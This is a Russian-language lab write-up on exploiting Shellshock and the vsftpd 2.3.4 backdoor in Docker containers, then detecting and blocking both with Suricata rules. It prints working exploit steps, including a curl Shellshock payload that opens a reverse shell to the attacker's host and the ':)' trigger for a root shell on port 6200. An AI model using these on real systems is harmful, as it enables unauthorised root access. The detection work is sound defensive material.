## Анализ и детектирование сетевых уязвимостей (Shellshock и vsftpd Backdoor)

В данной работе были развернуты и проэксплуатированы две известные исторические уязвимости: Shellshock (в веб-сервере CGI) и vsftpd 2.3.4 Backdoor (в FTP-сервере). Также были настроены правила IDS/IPS Suricata для обнаружения и блокировки этих атак.

### Shellshock (CVE-2014-6271)
Описание уязвимости
Shellshock — это критическая уязвимость в командной оболочке Bash, обнаруженная в сентябре 2014 года.

Суть проблемы: Bash позволял экспортировать определения функций через переменные окружения. Из-за ошибки в парсере, Bash продолжал выполнение кода, написанного после закрытия определения функции, при импорте этой переменной.

Механизм: Если атакующий мог внедрить строку вида `() { :; };` вредоносная_команда в переменную окружения (например, через HTTP-заголовки User-Agent, которые веб-сервер передает CGI-скриптам), то при запуске Bash эта команда выполнялась.

Последствия: Удаленное выполнение произвольного кода (RCE) с правами пользователя, под которым запущен веб-сервер.

Детектирование (Поиск уязвимости)
Самый простой способ обнаружить уязвимость — использование сканера Nmap со специальным скриптом.

```bash
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/vulnerable shellshock_victim
```
Получим следующий результат
```bash
┌──(root㉿b0985949ec71)-[/]
└─# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/vulnerable shellshock_victim
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-28 16:06 +0000
Nmap scan report for shellshock_victim (172.16.90.2)
Host is up (0.000071s latency).
rDNS record for 172.16.90.2: shellshock_victim.labnet

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
MAC Address: 9E:07:48:DD:79:B2 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds
```
### Эксплуатация (Reverse Shell)

Для получения полного доступа к серверу жертвы используется техника Reverse Shell.

Шаг 1. Подготовка "Ловушки" (Терминал 1)
В этом окне мы запустим netcat, который будет слушать порт 4444 и ждать, когда взломанный сервер к нам подключится.

```bash
docker exec -it attacker nc -lvnp 4444
```

Шаг 2. Отправка Эксплойта (Терминал 2)
В новом окно терминала мы отправим вредоносный HTTP-запрос с помощью curl из контейнера атакующего.

```bash
docker exec attacker curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/172.16.90.20/4444 0>&1" http://shellshock_victim/cgi-bin/vulnerable
```

Шаг 3. Выполняем команды (Терминал 1)

```bash
devopsuser@ubuntu-jammy:~$ docker exec -it attacker nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.16.90.20] from (UNKNOWN) [172.16.90.2] 59904
bash: no job control in this shell
www-data@62b124109bd2:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@62b124109bd2:/usr/lib/cgi-bin$ whoami
whoami
www-data
www-data@62b124109bd2:/usr/lib/cgi-bin$ ls -al
ls -al
total 12
drwxr-xr-x 1 root root 4096 Oct 30  2017 .
drwxr-xr-x 1 root root 4096 Oct 30  2017 ..
-rwxr-xr-x 1 root root   63 Oct 30  2017 vulnerable
www-data@62b124109bd2:/usr/lib/cgi-bin$ 
```
### Правила Suricata (Защита)

Для защиты необходимо искать сигнатуру определения функции () { :; }; в HTTP-заголовках.

```yaml
# 1. Shellshock - Nmap Specific
alert http any any -> any any (msg:"LAB ALARM: Shellshock Detected (Nmap Specific)"; http.user_agent; content:"() { |3A 3B|"; classtype:attempted-admin; sid:1000080; rev:2;)

# 2. Shellshock - Manual Curl
alert http any any -> any any (msg:"LAB ALARM: Shellshock Detected (Manual Curl)"; http.user_agent; content:"() {"; content:"}|3B|"; distance:0; within:20; classtype:attempted-admin; sid:1000082; rev:2;)
```

Получим логи Shellshock - Nmap Specific:

```json
devopsuser@ubuntu-jammy:~$ sudo grep "1000080" /var/log/suricata/eve.json | jq .
{
  "timestamp": "2025-12-28T17:07:33.037335+0000",
  "flow_id": 1553329106784415,
  "event_type": "alert",
  "src_ip": "172.16.90.20",
  "src_port": 51818,
  "dest_ip": "172.16.90.2",
  "dest_port": 80,
  "proto": "TCP",
  "ip_v": 4,
  "pkt_src": "wire/pcap",
  "tx_id": 0,
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 1000080,
    "rev": 2,
    "signature": "LAB ALARM: Shellshock Detected (Nmap Specific)",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "ts_progress": "request_complete",
  "tc_progress": "response_body",
  "http": {
    "hostname": "shellshock_victim",
    "url": "/cgi-bin/vulnerable",
    "http_user_agent": "() { :;}; echo; echo -n hzrerwl; echo zqzctyo",
    "http_refer": "() { :;}; echo; echo -n hzrerwl; echo zqzctyo",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "status": 200,
    "length": 20
  },
  "app_proto": "http",
  "direction": "to_server",
  "flow": {
    "pkts_toserver": 4,
    "pkts_toclient": 4,
    "bytes_toserver": 466,
    "bytes_toclient": 409,
    "start": "2025-12-28T17:07:33.033982+0000",
    "src_ip": "172.16.90.20",
    "dest_ip": "172.16.90.2",
    "src_port": 51818,
    "dest_port": 80
  }
}
```

Получим логи Shellshock - Manual Curl:

```json
devopsuser@ubuntu-jammy:~$ sudo grep "1000082" /var/log/suricata/eve.json | jq .
{
  "timestamp": "2025-12-28T17:07:33.037335+0000",
  "flow_id": 1553329106784415,
  "event_type": "alert",
  "src_ip": "172.16.90.20",
  "src_port": 51818,
  "dest_ip": "172.16.90.2",
  "dest_port": 80,
  "proto": "TCP",
  "ip_v": 4,
  "pkt_src": "wire/pcap",
  "tx_id": 0,
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 1000082,
    "rev": 2,
    "signature": "LAB ALARM: Shellshock Detected (Manual Curl)",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "ts_progress": "request_complete",
  "tc_progress": "response_body",
  "http": {
    "hostname": "shellshock_victim",
    "url": "/cgi-bin/vulnerable",
    "http_user_agent": "() { :;}; echo; echo -n hzrerwl; echo zqzctyo",
    "http_refer": "() { :;}; echo; echo -n hzrerwl; echo zqzctyo",
    "http_method": "GET",
    "protocol": "HTTP/1.1",
    "status": 200,
    "length": 20
  },
  "app_proto": "http",
  "direction": "to_server",
  "flow": {
    "pkts_toserver": 4,
    "pkts_toclient": 4,
    "bytes_toserver": 466,
    "bytes_toclient": 409,
    "start": "2025-12-28T17:07:33.033982+0000",
    "src_ip": "172.16.90.20",
    "dest_ip": "172.16.90.2",
    "src_port": 51818,
    "dest_port": 80
  }
}
```

### vsftpd 2.3.4 Backdoor (CVE-2011-2523)

Описание уязвимости
Это пример атаки на цепочку поставок (Supply Chain Attack). Уязвимость была обнаружена в июле 2011 года.

Суть проблемы: Неизвестные злоумышленники взломали сервера проекта vsftpd и подменили архив с исходным кодом версии 2.3.4. В код была внедрена "закладка".

Механизм: Если имя пользователя при входе заканчивалось на символы `:)` (смайлик), сервер автоматически открывал TCP-порт 6200 и запускал на нем командную оболочку (shell) с правами root.

Последствия: Полный компрометация сервера (Root RCE) без подбора пароля.

Детектирование
Nmap умеет определять точную версию сервиса и проверять наличие этого бэкдора.

```bash
nmap -sV -p 21 --script ftp-vsftpd-backdoor ftp_victim
```
Получим следующий результат
```bash
┌──(root㉿b0985949ec71)-[/]
└─# nmap -sV -p 21 --script ftp-vsftpd-backdoor ftp_victim
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-28 16:07 +0000
Nmap scan report for ftp_victim (172.16.90.15)
Host is up (0.000090s latency).
rDNS record for 172.16.90.15: ftp_victim.labnet

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://www.securityfocus.com/bid/48539
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
MAC Address: 8E:EA:10:6A:C6:50 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.79 seconds
```

### Эксплуатация

На атакующем контейнере выполняем (не закрываем терминал)

```bash
┌──(root㉿b0985949ec71)-[/]
└─# nc ftp_victim 21
220 (vsFTPd 2.3.4)
USER hacker:)
331 Please specify the password.
PASS pass123
```

Открываем еще один терминал, подключаемся к атакующему контнейнеру:

```bash
devopsuser@ubuntu-jammy:~$ docker exec -it attacker bash
┌──(root㉿b0985949ec71)-[/]
└─# nc ftp_victim 6200
id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Правила Suricata (Защита)

```yaml
# IDS (Alert) - Детектирование попытки активации
alert tcp any any -> any 21 (msg:"EXPLOIT: vsftpd 2.3.4 Backdoor Triggered :)"; flow:to_server,established; content:"USER"; nocase; content:":)"; distance:0; within:50; classtype:attempted-admin; sid:1000020; rev:1;)

# IPS (Drop) - Блокировка пакета с командой (соединение разорвется)
drop tcp any any -> any 21 (msg:"BLOCKED: vsftpd Backdoor Attempt"; flow:to_server,established; content:"USER"; nocase; content:":)"; distance:0; within:50; classtype:attempted-admin; sid:1000021; rev:1;)
```

Получим логи Shellshock - Manual Curl:

```json
devopsuser@ubuntu-jammy:~$ sudo grep "1000020" /var/log/suricata/eve.json | jq .
{
  "timestamp": "2025-12-28T17:47:34.069874+0000",
  "flow_id": 1678114223243518,
  "event_type": "alert",
  "src_ip": "172.16.90.20",
  "src_port": 48818,
  "dest_ip": "172.16.90.15",
  "dest_port": 21,
  "proto": "TCP",
  "ip_v": 4,
  "pkt_src": "wire/pcap",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 1000020,
    "rev": 1,
    "signature": "EXPLOIT: vsftpd 2.3.4 Backdoor Triggered :)",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "app_proto": "ftp",
  "direction": "to_server",
  "flow": {
    "pkts_toserver": 6,
    "pkts_toclient": 8,
    "bytes_toserver": 340,
    "bytes_toclient": 510,
    "start": "2025-12-28T17:47:33.063036+0000",
    "src_ip": "172.16.90.20",
    "dest_ip": "172.16.90.15",
    "src_port": 48818,
    "dest_port": 21
  }
}
{
  "timestamp": "2025-12-28T17:48:20.305072+0000",
  "flow_id": 1808168241541617,
  "event_type": "alert",
  "src_ip": "172.16.90.20",
  "src_port": 60462,
  "dest_ip": "172.16.90.15",
  "dest_port": 21,
  "proto": "TCP",
  "ip_v": 4,
  "pkt_src": "stream (flow timeout)",
  "alert": {
    "action": "allowed",
    "gid": 1,
    "signature_id": 1000020,
    "rev": 1,
    "signature": "EXPLOIT: vsftpd 2.3.4 Backdoor Triggered :)",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "app_proto": "ftp",
  "direction": "to_server",
  "flow": {
    "pkts_toserver": 10,
    "pkts_toclient": 9,
    "bytes_toserver": 558,
    "bytes_toclient": 562,
    "start": "2025-12-28T17:47:50.683140+0000",
    "src_ip": "172.16.90.20",
    "dest_ip": "172.16.90.15",
    "src_port": 60462,
    "dest_port": 21
  }
}
```
и drop правило

```json
devopsuser@ubuntu-jammy:~$ sudo grep "1000021" /var/log/suricata/eve.json | jq .
{
  "timestamp": "2025-12-28T17:47:34.069874+0000",
  "flow_id": 1678114223243518,
  "event_type": "alert",
  "src_ip": "172.16.90.20",
  "src_port": 48818,
  "dest_ip": "172.16.90.15",
  "dest_port": 21,
  "proto": "TCP",
  "ip_v": 4,
  "pkt_src": "wire/pcap",
  "alert": {
    "action": "blocked",
    "gid": 1,
    "signature_id": 1000021,
    "rev": 1,
    "signature": "BLOCKED: vsftpd Backdoor Attempt",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "app_proto": "ftp",
  "direction": "to_server",
  "flow": {
    "pkts_toserver": 6,
    "pkts_toclient": 8,
    "bytes_toserver": 340,
    "bytes_toclient": 510,
    "start": "2025-12-28T17:47:33.063036+0000",
    "src_ip": "172.16.90.20",
    "dest_ip": "172.16.90.15",
    "src_port": 48818,
    "dest_port": 21
  }
}
{
  "timestamp": "2025-12-28T17:48:20.305072+0000",
  "flow_id": 1808168241541617,
  "event_type": "alert",
  "src_ip": "172.16.90.20",
  "src_port": 60462,
  "dest_ip": "172.16.90.15",
  "dest_port": 21,
  "proto": "TCP",
  "ip_v": 4,
  "pkt_src": "stream (flow timeout)",
  "alert": {
    "action": "blocked",
    "gid": 1,
    "signature_id": 1000021,
    "rev": 1,
    "signature": "BLOCKED: vsftpd Backdoor Attempt",
    "category": "Attempted Administrator Privilege Gain",
    "severity": 1
  },
  "app_proto": "ftp",
  "direction": "to_server",
  "flow": {
    "pkts_toserver": 10,
    "pkts_toclient": 9,
    "bytes_toserver": 558,
    "bytes_toclient": 562,
    "start": "2025-12-28T17:47:50.683140+0000",
    "src_ip": "172.16.90.20",
    "dest_ip": "172.16.90.15",
    "src_port": 60462,
    "dest_port": 21
  }
}
```

соединение будет закрыто

```bash
┌──(root㉿b0985949ec71)-[/]
└─# nc ftp_victim 21
220 (vsFTPd 2.3.4)
USER test_user:)
331 Please specify the password.
PASS passwd1
500 OOPS: priv_sock_get_result
```

Порт 6200 будет не доступен

```bash
┌──(root㉿b0985949ec71)-[/]
└─# nc ftp_victim 6200
ftp_victim [172.16.90.15] 6200 (?) : Connection refused
```

